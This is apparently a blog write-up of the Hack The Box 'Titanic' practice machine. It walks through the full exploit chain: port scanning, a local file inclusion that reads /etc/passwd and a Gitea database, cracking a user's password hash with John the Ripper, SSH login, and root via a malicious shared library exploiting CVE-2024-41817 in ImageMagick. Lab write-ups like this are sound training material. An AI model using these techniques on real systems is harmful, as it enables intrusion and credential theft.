---
layout: post
title: "Titanic HTB Writeup"
date: Feb 28, 2025
---

Link to the machine: `https://app.hackthebox.com/machines/Titanic`

Per usual, we scan for open ports.

```
0 kjc@kjc:~$ nmap 10.10.11.55
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-24 10:38 EST
Nmap scan report for 10.10.11.55
Host is up (0.069s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
```

It looks like there's a website and SSH connection. On the website, we can book a ticket. On doing so, there are two request that are made.

![](/assets/2025-02-24T10:52:36-05:00.png)

Looking at the `download?ticket=9d9eaf55-3e76-4670-9351-7f25a1545c3d.json` part of the second request more closely, I suspected there was an LFI. Indeed, there is one. By replacing the JSON file with `/etc/passwd` we get its contents. In particular, the `developer` account is interesting.

```
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
```

Trying more filenames, we find some interesting `/etc/hosts` entries:

```
127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

At the subdomain `dev.titanic.htb` we find a Gitea instance with two repos. The `flask-app` one is not interesting, but the `docker-config` contains some juicy details:

```
# gitea/docker-compose.yml
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```

We can use the LFI again to fetch `/home/developer/gitea/data/gitea/conf/app.ini` which is described on Gitea's documentation, and points us to the DB file at `/home/developer/data/gitea/gitea.db`. In the `user` table we can find the credentials:

```
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1740412843|1740412843|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
3|test|test||test@test.com|0|enabled|0fb2cbd96b68e663c6fe7a2db29c4eb4a9836f740f3ca65662425acf9781aed661a06761d06b99023d0969b57c70d6ece21e|pbkdf2$50000$50|0|0|0||0|||f815e73b2ad7186a678bb47c32024cd5|91af6cb2fec11f9f28ca337bb7cd96c9|en-US||1740410708|1740410716|1740410708|0|-1|1|0|0|0|0|1|0|b642b4217b34b1e8d3bd915fc65c4452|test@test.com|0|0|0|0|0|0|0|0|0||gitea-auto|0
```

I was able to convert the hashes for the developer to a format that John the Ripper would accept. The password is "25282528".

```
kjc@kjc:~$ john hash.txt --wordlist=wordlists/rockyou.txt
'Warning: detected hash type "PBKDF2-HMAC-SHA256", but the string is also recognized as "PBKDF2-HMAC-SHA256-opencl"
Use the "--format=PBKDF2-HMAC-SHA256-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (PBKDF2-HMAC-SHA256 [PBKDF2-SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 50000 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
0g 0:00:00:01 0.02% (ETA: 14:28:51) 0g/s 1638p/s 1638c/s 1638C/s slimshady..dangerous
25282528         (?)
1g 0:00:00:03 DONE (2025-02-24 12:52) 0.2703g/s 1660p/s 1660c/s 1660C/s VANESSA..horoscope
Use the "--show --format=PBKDF2-HMAC-SHA256" options to display all of the cracked passwords reliably
Session completed.
```

With the password, we can SSH into the developer's user on the machine. We find the user flag immediately.

```
developer@titanic:~$ ls
gitea  mysql  user.txt
developer@titanic:~$ cat user.txt
53e5d7d5aeecf65edb82c4bd0c1de901
developer@titanic:~$
```

By looking through the filesystem and trying to find anything executable, we find a script in `/opt/scripts` which runs ImageMagick. We can exploit the script with CVE-2024-41817, like this:

```
developer@titanic:/opt/scripts$ cd /opt/app/static/assets/images
developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt >/home/developer/root.txt");
    exit(0);
}
EOF
developer@titanic:/opt/app/static/assets/images$ cat ~/root.txt
2e563b9d4c49e0c4d8d5461feffa22ab
```

And now we have both the flags, which concludes the HTB box.
